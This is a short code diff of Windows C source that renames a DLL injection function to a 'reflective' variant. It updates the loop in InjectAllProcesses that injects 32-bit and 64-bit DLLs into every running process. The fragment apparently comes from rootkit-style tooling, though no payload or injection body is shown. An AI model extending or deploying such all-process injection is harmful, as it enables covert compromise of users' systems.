@@ -4,7 +4,7 @@
 #include <Shlwapi.h>
 #include <Psapi.h>
 
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout)
+BOOL InjectDllReflective(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout)
 {
 	BOOL result = FALSE;
 
@@ -91,8 +91,8 @@ BOOL InjectAllProcesses(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64
 
 		for (DWORD i = 0; i < processCount; i++)
 		{
-			InjectDll(processes[i], dll32, dll32Size, 0);
-			InjectDll(processes[i], dll64, dll64Size, 0);
+			InjectDllReflective(processes[i], dll32, dll32Size, 0);
+			InjectDllReflective(processes[i], dll64, dll64Size, 0);
 		}
 
 		result = TRUE;
